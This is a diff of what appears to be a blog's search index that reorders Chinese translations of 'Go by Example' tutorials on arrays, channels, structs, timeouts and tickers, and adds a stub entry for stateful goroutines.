@@ -148,28 +148,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Go by Example - Array</title>
-    <url>/2017/07/11/go-by-example-array/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Array"><a href="#Go-by-Example-Array" class="headerlink" title="Go by Example: Array"></a><center>Go by Example: Array</center></h2><p>golang中的数组是一个<strong>特定长度</strong>的元素有序集合。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个长度为5的元素类型为int的数组，元素的类型和数组的长度都是数组的属性。默认情况数组是零值，如int型的话就是数组长度个0。</span></span><br><span class="line">    <span class="keyword">var</span> a[<span class="number">5</span>] <span class="type">int</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;emp:&quot;</span>, a)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据索引设置／获取数组中某项的值</span></span><br><span class="line">    a[<span class="number">4</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;set:&quot;</span>, a)</span><br><span class="line">    fmt.Println(<span class="string">&quot;get:&quot;</span>, a[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取数组的长度</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(a))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义并初始化一个数组</span></span><br><span class="line">    b := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dcl:&quot;</span>, b)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组类型是一维的，但是可以通过复合类型来构造多维的结构。</span></span><br><span class="line">    <span class="keyword">var</span> twoD [<span class="number">2</span>][<span class="number">3</span>]<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            twoD[i][j] = i + j</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;2d:&quot;</span>, twoD)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run arrays.go</span><br><span class="line">emp: [0 0 0 0 0]</span><br><span class="line"><span class="built_in">set</span>: [0 0 0 0 100]</span><br><span class="line">get: 100</span><br><span class="line">len: 5</span><br><span class="line">dcl: [1 2 3 4 5]</span><br><span class="line">2d:  [[0 1 2] [1 2 3]]</span><br></pre></td></tr></table></figure>
-
-
-<p>原文链接：<a href="https://gobyexample.com/arrays">Go by Example: Arrays</a></p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>《约翰·克利斯朵夫》节选</title>
     <url>/2017/08/21/Jean-Christophe-Note/</url>
     <content><![CDATA[<blockquote>
@@ -301,40 +279,21 @@
       </tags>
   </entry>
   <entry>
-    <title>Go by Example - Channel Buffering</title>
-    <url>/2017/08/03/go-by-example-channel-buffer/</url>
+    <title>Go by Example - Array</title>
+    <url>/2017/07/11/go-by-example-array/</url>
     <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
 <blockquote>
 <p>Go by Example</p>
 <p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
 <p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
 </blockquote>
-<h2 id="Go-by-Example-Channel-Buffering"><a href="#Go-by-Example-Channel-Buffering" class="headerlink" title="Go by Example: Channel Buffering"></a><center>Go by Example: Channel Buffering</center></h2><p>默认情况下channel是没有缓冲区的，这意味着它们只会在有一个相应的接收者准备好接收管道数据时才会接受发送者往管道发送数据。有缓冲区的channel可以在没有相应接收者时接受发送者发送特定数量的数值。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个string类型的，缓冲区长度为2的channel</span></span><br><span class="line">    messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于创建的channel有缓冲区，所以可以直接往里面发送数据而不需要有接收者。</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;buffered&quot;</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;channel&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的数据</span></span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Go-by-Example-Array"><a href="#Go-by-Example-Array" class="headerlink" title="Go by Example: Array"></a><center>Go by Example: Array</center></h2><p>golang中的数组是一个<strong>特定长度</strong>的元素有序集合。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个长度为5的元素类型为int的数组，元素的类型和数组的长度都是数组的属性。默认情况数组是零值，如int型的话就是数组长度个0。</span></span><br><span class="line">    <span class="keyword">var</span> a[<span class="number">5</span>] <span class="type">int</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;emp:&quot;</span>, a)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据索引设置／获取数组中某项的值</span></span><br><span class="line">    a[<span class="number">4</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;set:&quot;</span>, a)</span><br><span class="line">    fmt.Println(<span class="string">&quot;get:&quot;</span>, a[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取数组的长度</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(a))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义并初始化一个数组</span></span><br><span class="line">    b := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dcl:&quot;</span>, b)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组类型是一维的，但是可以通过复合类型来构造多维的结构。</span></span><br><span class="line">    <span class="keyword">var</span> twoD [<span class="number">2</span>][<span class="number">3</span>]<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            twoD[i][j] = i + j</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;2d:&quot;</span>, twoD)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>原文链接：<a href="https://gobyexample.com/channel-buffering">Go by Example: Channel Buffering</a></p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Go by Example - Channel Synchronization</title>
-    <url>/2017/08/03/go-by-example-channel-synchronization/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Channel-Synchronization"><a href="#Go-by-Example-Channel-Synchronization" class="headerlink" title="Go by Example: Channel Synchronization"></a><center>Go by Example: Channel Synchronization</center></h2><p>我们可以使用channel来同步不同goroutine的执行。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，接收一个channel作为参数，该参数用来通知另一个goroutine该函数已经执行完毕</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;working...&quot;</span>)</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将成功信号发往channel</span></span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动新的goroutine执行worker函数，并出入channel</span></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的值</span></span><br><span class="line">    <span class="comment">// 如果移除这一句可能收不到任何输出，因为程序可能在worker函数还未执行已经结束了</span></span><br><span class="line">    &lt;-done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run channel-synchronization.go      </span><br><span class="line">working...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run arrays.go</span><br><span class="line">emp: [0 0 0 0 0]</span><br><span class="line"><span class="built_in">set</span>: [0 0 0 0 100]</span><br><span class="line">get: 100</span><br><span class="line">len: 5</span><br><span class="line">dcl: [1 2 3 4 5]</span><br><span class="line">2d:  [[0 1 2] [1 2 3]]</span><br></pre></td></tr></table></figure>
 
 
-<p>原文链接：<a href="https://gobyexample.com/channel-synchronization">Go by Example: Channel Synchronization</a></p>
+<p>原文链接：<a href="https://gobyexample.com/arrays">Go by Example: Arrays</a></p>
 ]]></content>
       <categories>
         <category>golang</category>
@@ -364,6 +323,25 @@
       </categories>
   </entry>
   <entry>
+    <title>Go by Example - Channel Buffering</title>
+    <url>/2017/08/03/go-by-example-channel-buffer/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
+<h2 id="Go-by-Example-Channel-Buffering"><a href="#Go-by-Example-Channel-Buffering" class="headerlink" title="Go by Example: Channel Buffering"></a><center>Go by Example: Channel Buffering</center></h2><p>默认情况下channel是没有缓冲区的，这意味着它们只会在有一个相应的接收者准备好接收管道数据时才会接受发送者往管道发送数据。有缓冲区的channel可以在没有相应接收者时接受发送者发送特定数量的数值。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个string类型的，缓冲区长度为2的channel</span></span><br><span class="line">    messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于创建的channel有缓冲区，所以可以直接往里面发送数据而不需要有接收者。</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;buffered&quot;</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;channel&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的数据</span></span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原文链接：<a href="https://gobyexample.com/channel-buffering">Go by Example: Channel Buffering</a></p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Go by Example - Channel Directions</title>
     <url>/2017/08/23/go-by-example-channel-direction/</url>
     <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
@@ -379,6 +357,28 @@
 
 
 <p>原文链接：<a href="https://gobyexample.com/channel-directions">Go by Example: Channel Directions</a></p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Go by Example - Channel Synchronization</title>
+    <url>/2017/08/03/go-by-example-channel-synchronization/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
+<h2 id="Go-by-Example-Channel-Synchronization"><a href="#Go-by-Example-Channel-Synchronization" class="headerlink" title="Go by Example: Channel Synchronization"></a><center>Go by Example: Channel Synchronization</center></h2><p>我们可以使用channel来同步不同goroutine的执行。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，接收一个channel作为参数，该参数用来通知另一个goroutine该函数已经执行完毕</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;working...&quot;</span>)</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将成功信号发往channel</span></span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动新的goroutine执行worker函数，并出入channel</span></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的值</span></span><br><span class="line">    <span class="comment">// 如果移除这一句可能收不到任何输出，因为程序可能在worker函数还未执行已经结束了</span></span><br><span class="line">    &lt;-done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run channel-synchronization.go      </span><br><span class="line">working...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<p>原文链接：<a href="https://gobyexample.com/channel-synchronization">Go by Example: Channel Synchronization</a></p>
 ]]></content>
       <categories>
         <category>golang</category>
@@ -885,27 +885,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Go by Example - Structs</title>
-    <url>/2017/07/28/go-by-example-struct/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Structs"><a href="#Go-by-Example-Structs" class="headerlink" title="Go by Example: Structs"></a><center>Go by Example: Structs</center></h2><p>golang中定义结构体为一系列元素的集合，这对于将数据分组记录很有用。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体，含有name和age两个字段</span></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 实例化一个person结构体</span></span><br><span class="line">    fmt.Println(person&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">20</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以指定字段名赋值进行实例化</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Alice&quot;</span>, age: <span class="number">30</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化为赋值的元素默认为零值</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Fred&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印一个指向结构体的指针</span></span><br><span class="line">    fmt.Println(&amp;person&#123;name: <span class="string">&quot;Ann&quot;</span>, age: <span class="number">40</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用.操作符来操作结构体的字段</span></span><br><span class="line">    s := person&#123;name: <span class="string">&quot;Sean&quot;</span>, age: <span class="number">50</span>&#125;</span><br><span class="line">    fmt.Println(s.name)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以使用.操作符操作结构体指针的字段，此时指针会自动取消引用转化为结构体本身</span></span><br><span class="line">    sp := &amp;s</span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构体的值是可变的</span></span><br><span class="line">    sp.age = <span class="number">51</span></span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run structs.go</span><br><span class="line">&#123;Bob 20&#125;</span><br><span class="line">&#123;Alice 30&#125;</span><br><span class="line">&#123;Fred 0&#125;</span><br><span class="line">&amp;&#123;Ann 40&#125;</span><br><span class="line">Sean</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td></tr></table></figure>
-
-<p>原文链接：<a href="https://gobyexample.com/structs">Go by Example: Structs</a></p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Go by Example - Sorting</title>
     <url>/2019/04/13/go-by-example-sorting/</url>
     <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
@@ -922,6 +901,43 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run sorting.go</span><br><span class="line">Strings: [a b c]</span><br><span class="line">Ints: [2 4 7]</span><br><span class="line">Sorted: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
 <p>原文链接：<a href="https://gobyexample.com/sorting">Go by Example: Slices</a></p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Go by Example - Stateful Goroutines</title>
+    <url>/2018/02/06/go-by-example-stateful-goroutines/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
+<h2 id="Go-by-Example-Stateful-Goroutines"><a href="#Go-by-Example-Stateful-Goroutines" class="headerlink" title="Go by Example: Stateful Goroutines"></a><center>Go by Example: Stateful Goroutines</center></h2><p>未完待续…</p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Go by Example - Structs</title>
+    <url>/2017/07/28/go-by-example-struct/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
+<h2 id="Go-by-Example-Structs"><a href="#Go-by-Example-Structs" class="headerlink" title="Go by Example: Structs"></a><center>Go by Example: Structs</center></h2><p>golang中定义结构体为一系列元素的集合，这对于将数据分组记录很有用。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体，含有name和age两个字段</span></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 实例化一个person结构体</span></span><br><span class="line">    fmt.Println(person&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">20</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以指定字段名赋值进行实例化</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Alice&quot;</span>, age: <span class="number">30</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化为赋值的元素默认为零值</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Fred&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印一个指向结构体的指针</span></span><br><span class="line">    fmt.Println(&amp;person&#123;name: <span class="string">&quot;Ann&quot;</span>, age: <span class="number">40</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用.操作符来操作结构体的字段</span></span><br><span class="line">    s := person&#123;name: <span class="string">&quot;Sean&quot;</span>, age: <span class="number">50</span>&#125;</span><br><span class="line">    fmt.Println(s.name)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以使用.操作符操作结构体指针的字段，此时指针会自动取消引用转化为结构体本身</span></span><br><span class="line">    sp := &amp;s</span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构体的值是可变的</span></span><br><span class="line">    sp.age = <span class="number">51</span></span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run structs.go</span><br><span class="line">&#123;Bob 20&#125;</span><br><span class="line">&#123;Alice 30&#125;</span><br><span class="line">&#123;Fred 0&#125;</span><br><span class="line">&amp;&#123;Ann 40&#125;</span><br><span class="line">Sean</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td></tr></table></figure>
+
+<p>原文链接：<a href="https://gobyexample.com/structs">Go by Example: Structs</a></p>
 ]]></content>
       <categories>
         <category>golang</category>
@@ -950,28 +966,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Go by Example - Timeouts</title>
-    <url>/2017/08/24/go-by-example-timeout/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Timeouts"><a href="#Go-by-Example-Timeouts" class="headerlink" title="Go by Example: Timeouts"></a><center>Go by Example: Timeouts</center></h2><p>超时对于需要联接外部资源或需要限定执行时间的程序非常重要，在golang中因为存在<code>channel</code>和<code>select</code>使得超时实现起来非常简单。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 通过管道c1模拟一个2s后才有返回值的外部请求</span></span><br><span class="line">    c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c1 &lt;- <span class="string">&quot;result 1&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用select执行一条超时操作</span></span><br><span class="line">    <span class="comment">// res等待管道c1的值，&lt;-time.After(time.Second * 1)等待一个一秒后发送的值。</span></span><br><span class="line">    <span class="comment">// 由于select会执行第一个就绪的条件，所以如果前者执行时间超过后者代码中规定的一秒便会进入后者超时的情况</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c1:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout1&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于res会在两秒后就绪，小于超时的三秒限制，所以不会超时</span></span><br><span class="line">    c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c2 &lt;- <span class="string">&quot;result 2&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c2:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">3</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout 2&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run timeout.go</span><br><span class="line">timeout1</span><br><span class="line">result 2</span><br></pre></td></tr></table></figure>
-
-<p>使用select结构的超时模式需要借助管道进行通信，这通常是个好主意因为其他一些golang重要的功能也是基于管道和select。</p>
-<p>原文链接：<a href="https://gobyexample.com/timeouts">Go by Example: Timeouts</a></p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Go by Example - Tickers</title>
     <url>/2017/09/06/go-by-example-tikers/</url>
     <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
@@ -987,6 +981,28 @@
 
 <p>在执行1600毫秒被停止时Ticker 500毫秒的间隔应该已经重复执行了三次</p>
 <p>原文链接：<a href="https://gobyexample.com/tickers">Go by Example: Tickers</a></p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Go by Example - Timeouts</title>
+    <url>/2017/08/24/go-by-example-timeout/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
